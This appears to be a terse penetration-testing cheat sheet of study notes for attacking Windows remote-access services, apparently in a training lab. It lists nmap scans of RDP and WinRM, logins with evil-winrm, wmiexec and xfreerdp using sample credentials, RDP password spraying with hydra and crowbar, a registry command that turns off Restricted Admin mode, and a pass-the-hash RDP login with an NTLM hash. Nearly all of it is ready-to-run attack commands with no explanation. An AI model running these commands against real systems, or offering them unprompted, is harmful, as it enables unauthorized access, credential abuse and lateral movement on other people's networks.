
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n

sudo cpan

```
xfreerdp /u:fiona /p:"987654321" /v:10.129.203.7
```

winrm
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n

evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!


/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

/usr/share/legion/scripts/rdp-sec-check.pl 10.129.202.41   

RDP password spraying
```
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
or
```
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

disable restricted Admin mode
```
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

RDP with PTH
```
xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
```

